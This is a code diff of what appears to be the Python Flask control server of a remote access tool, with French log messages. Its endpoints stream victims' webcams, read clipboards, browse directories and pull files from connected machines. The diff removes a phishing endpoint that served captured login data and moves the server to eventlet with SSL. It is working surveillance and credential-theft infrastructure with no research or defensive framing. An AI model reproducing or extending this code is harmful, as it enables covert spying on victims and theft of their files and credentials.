@@ -8,6 +8,7 @@ from logging.handlers import RotatingFileHandler
 from queue import Queue, Empty
 
 import click
+import eventlet.wsgi
 from flask import Flask, request, send_file, Response, jsonify, render_template, redirect, url_for
 from flask_jwt_extended import create_access_token, jwt_required, JWTManager
 from flask_migrate import Migrate
@@ -53,7 +54,6 @@ webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 clipboard_ns = api.namespace('api/v1/clipboard', description='Clipboard operations')
 download_file_ns = api.namespace('api/v1/download', description='Download file operations')
 directory_ns = api.namespace('api/v1/directory', description='Directory operations')
-phishing_ns = api.namespace('api/v1/phishing', description='Phishing operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -402,8 +402,7 @@ class StreamWebcam(Resource):
 
         global stop_streaming
         stop_streaming = False
-        socketio.emit('start_stream', {'user_id': client_id}, room=sid)
-        # threading.Thread(target=gen_frames, args=(socketio,)).start()
+        socketio.emit('start_stream', room=client.sid)
         return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 
@@ -475,7 +474,7 @@ class GetDownloadFile(Resource):
             return {'status': 'error', 'message': 'Fichier non trouvé.'}, 404
 
 
-@socketio.on('connect')
+@socketio.on('connect', namespace='/')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     app.logger.info(f"Client connecté: {client_ip}")
@@ -637,6 +636,7 @@ def handle_stop_stream():
     stop_streaming = True
     app.logger.info("Arrêt du streaming demandé par le client.")
 
+
 @socketio.on('file_response')
 def handle_file(data):
     file_data = base64.b64decode(data.get('file'))
@@ -732,17 +732,9 @@ def login():
         return "Missing data", 400
 
 
-@phishing_ns.route('/login_data')
-class GetLoginData(Resource):
-    @jwt_required()
-    @api.doc(security='bearer_auth')
-    def get(self):
-        if os.path.exists('phishing/login_data.txt'):
-            return send_file('phishing/login_data.txt')
-        else:
-            return {'status': 'error', 'message': 'Fichier de données de connexion non trouvé.'}, 404
-
-
 setup_logging()
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True, ssl_context=('cert.pem', 'key.pem'))
+    eventlet.wsgi.server(eventlet.wrap_ssl(eventlet.listen(('0.0.0.0', 5000)),
+                                           certfile='cert.pem',
+                                           keyfile='key.pem',
+                                           server_side=True), app)
